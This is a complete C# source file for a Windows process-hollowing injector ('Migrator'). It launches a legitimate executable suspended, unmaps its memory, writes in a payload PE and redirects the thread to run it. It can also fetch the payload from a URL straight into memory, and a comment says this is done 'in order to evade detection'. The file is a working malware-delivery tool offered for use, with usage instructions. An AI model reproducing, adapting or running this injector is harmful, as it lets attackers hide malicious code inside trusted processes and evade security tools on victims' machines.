using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace PEx64_Injector
{
    // Ensure unsafe code is enabled from build options.
    public static class Migrate
    {
        // Special thanks to gigajew.
        #region DllImport
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName,
                                                 string lpCommandLine,
                                                 IntPtr lpProcessAttributes,
                                                 IntPtr lpThreadAttributes,
                                                 bool bInheritHandles,
                                                 uint dwCreationFlags,
                                                 IntPtr lpEnvironment,
                                                 string lpCurrentDirectory,
                                                 byte[] lpStartupInfo,
                                                 byte[] lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern long VirtualAllocEx(long hProcess,
                                                  long lpAddress,
                                                  long dwSize,
                                                  uint flAllocationType,
                                                  uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern long WriteProcessMemory(long hProcess,
                                                      long lpBaseAddress,
                                                      byte[] lpBuffer,
                                                      int nSize,
                                                      long written);

        [DllImport("ntdll.dll")]
        private static extern uint ZwUnmapViewOfSection(long ProcessHandle,
                                                        long BaseAddress);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(long hThread,
                                                    IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(long hThread,
                                                    IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(long hThread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(long handle);
        #endregion

        public static void Load(byte[] payloadBuffer, string host, string args)
        {
            int e_lfanew = Marshal.ReadInt32(payloadBuffer, 0x3c);
            int sizeOfImage = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x038);
            int sizeOfHeaders = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x03c);
            int entryPoint = Marshal.ReadInt32(payloadBuffer, e_lfanew + 0x18 + 0x10);

            short numberOfSections = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x2);
            short sizeOfOptionalHeader = Marshal.ReadInt16(payloadBuffer, e_lfanew + 0x4 + 0x10);

            long imageBase = Marshal.ReadInt64(payloadBuffer, e_lfanew + 0x18 + 0x18);

            byte[] bStartupInfo = new byte[0x68];
            byte[] bProcessInfo = new byte[0x18];

            IntPtr pThreadContext = Allocate(0x4d0, 16);

            string targetHost = host;
            if (!string.IsNullOrEmpty(args))
                targetHost += " " + args;
            string currentDirectory = Directory.GetCurrentDirectory();

            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);

            CreateProcess(null, targetHost, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
            long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
            long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);

            ZwUnmapViewOfSection(processHandle, imageBase);
            VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
            WriteProcessMemory(processHandle, imageBase, payloadBuffer, sizeOfHeaders, 0L);

            for (short i = 0; i < numberOfSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(payloadBuffer, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);

                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(payloadBuffer, pointerToRawData, bRawData, 0, bRawData.Length);

                WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
            }

            GetThreadContext(threadHandle, pThreadContext);

            byte[] bImageBase = BitConverter.GetBytes(imageBase);

            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
            WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);

            Marshal.WriteInt64(pThreadContext, 0x80 /* rcx */, imageBase + entryPoint);

            SetThreadContext(threadHandle, pThreadContext);
            ResumeThread(threadHandle);

            Marshal.FreeHGlobal(pThreadContext);
            CloseHandle(processHandle);
            CloseHandle(threadHandle);
        }

        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }

        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }
    }

    // added new feature, download the executable from url in order to evade detection.
    class Program
    {
        static async Task Main(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("\n\n[*] Developed By 0xyg3n\n\n[!] Invalid Arguments Specified..\n\n[*] Usage: Migrator.exe payload(fpath or URL) migratefile(fpath)\n\n[*] Example: Migrator.exe C:\\Users\\User\\Desktop\\Putty64.exe C:\\Windows\\System32\\notepad.exe\n[*] Example: Migrator.exe https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\\Windows\\System32\\notepad.exe\n\n");
                    Environment.Exit(0);
                }
                else
                {
                    // The file you want to inject (payload).
                    string payload = args[0];
                    // The executable you want to inject to (hostfile).
                    string migratefile = args[1];

                    byte[] payloadData;

                    // Check if the payload is a URL or a file path
                    if (Uri.IsWellFormedUriString(payload, UriKind.Absolute))
                    {
                        // Download the file directly into memory
                        payloadData = await DownloadFileAsync(payload);
                        Console.WriteLine("[*] Downloaded payload from URL.");
                    }
                    else
                    {
                        // Read the payload from the file
                        payloadData = File.ReadAllBytes(payload);
                        Console.WriteLine("[*] Loaded payload from file.");
                    }

                    string arguments = ""; // Arguments can be added if needed.
                    Migrate.Load(payloadData, migratefile, arguments);
                    Console.WriteLine("\n\n[*] Migrated Successfully!");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\n\n[*] Migration Failed: " + ex.Message);
            }
        }

        static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                // Send a GET request
                HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode(); // Throw if not a success code.

                // Read the response content as a byte array
                return await response.Content.ReadAsByteArrayAsync();
            }
        }
    }
}
